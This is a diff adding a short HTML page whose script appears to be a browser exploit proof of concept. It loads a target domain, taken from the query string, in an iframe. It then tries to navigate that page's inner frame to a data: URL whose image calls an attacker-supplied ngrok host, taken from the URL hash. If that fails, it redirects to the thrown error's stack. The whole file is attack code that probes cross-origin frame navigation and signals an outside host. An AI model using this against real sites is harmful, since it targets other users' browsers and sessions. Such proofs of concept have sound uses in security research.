@@ -1,0 +1,17 @@
+<body>
+  <script>
+    const domain = window.location.search.slice(1)
+    const ngrok = window.location.hash.slice(1)
+    const iframe = Object.assign(document.createElement('iframe'), {
+      src: `https://${domain}/`
+    })
+    document.body.append(iframe)
+    iframe.onload = () => {
+      try {
+        iframe.contentWindow.frames[0].location = `data:text/html,<img src="https://${ngrok}/hi">`
+      } catch (err) {
+        window.location = err.stack
+      }
+    }
+  </script>
+</body>
